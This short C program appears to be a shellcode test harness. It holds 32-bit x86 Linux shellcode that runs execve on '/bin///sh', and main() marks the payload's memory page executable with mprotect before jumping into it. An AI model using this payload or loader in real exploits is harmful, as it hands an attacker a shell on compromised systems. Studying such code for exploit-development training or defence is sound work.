#include <stdio.h>
#include <sys/mman.h>

const char shellcode[] =  
{0x6a, 0x68, 0x68, 0x2f, 0x2f, 0x2f, 0x73, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x68, 0x1, 0x1, 0x1, 0x1, 0x81, 0x34, 0x24, 0x72, 0x69, 0x1, 0x1, 0x31, 0xc9, 0x51, 0x6a, 0x4, 0x59, 0x1, 0xe1, 0x51, 0x89, 0xe1, 0x31, 0xd2, 0x6a, 0xb, 0x58, 0xcd, 0x80};



int main() { 

    mprotect(
        (void *)((int)shellcode & ~4095),
        4096,
        PROT_READ | PROT_WRITE | PROT_EXEC
    );


    int (*func)() = (int(*)())shellcode;
    return func();
}

